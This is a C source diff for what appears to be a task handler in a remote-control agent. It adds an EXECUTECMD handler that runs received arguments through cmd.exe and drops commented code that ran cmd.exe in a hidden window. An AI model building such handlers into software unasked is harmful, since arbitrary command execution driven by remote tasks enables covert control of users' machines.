@@ -1,4 +1,7 @@
+#include <tchar.h> // _tcscpy_s, _tcscmp
+
 #include "Commands.h"
+#include "..\Debugger.h"
 
 VOID _on_task_MESSAGEBOX(CONST PTCHAR args, PTCHAR result)
 {
@@ -13,16 +16,19 @@ VOID _on_task_MOUSECTRL(CONST PTCHAR args, PTCHAR result)
 	
 }
 
-//TCHAR buf[ARGS_LENGTH + 3] = TEXT(" /c"); // +3 for '/c'
-//strcat_s(buf, ARGS_LENGTH + 3, args);
-// SHELLEXECUTEINFO shell = { sizeof(SHELLEXECUTEINFO) };
-// shell.fMask = SEE_MASK_NOCLOSEPROCESS;
-// shell.lpFile = "cmd.exe";
-// shell.lpParameters = "ipconfig > a.txt";
-// shell.nShow = SW_HIDE;
-// ShellExecuteEx(&shell);
-// WaitForSingleObject(shell.hProcess, INFINITE);
-//ShellExecuteEx(NULL, TEXT("open"), TEXT("cmd.exe"), TEXT("ipconfig > a.out"), NULL, SW_HIDE);
+VOID _on_task_EXECUTECMD(CONST PTCHAR args, PTCHAR result)
+{
+	SHELLEXECUTEINFO shell = { sizeof(SHELLEXECUTEINFO) };
+	shell.fMask            = SEE_MASK_DEFAULT;
+	shell.lpVerb           = TEXT("open"); // Yep, i know that it ia a default value
+	shell.lpFile           = TEXT("cmd.exe");
+	shell.lpParameters     = args;
+	shell.nShow            = SW_SHOW;
+	if (!ShellExecuteEx(&shell))
+		_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
+	else
+		_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
+}
 
 INT cmd2code(CONST PTCHAR cmd)
 {
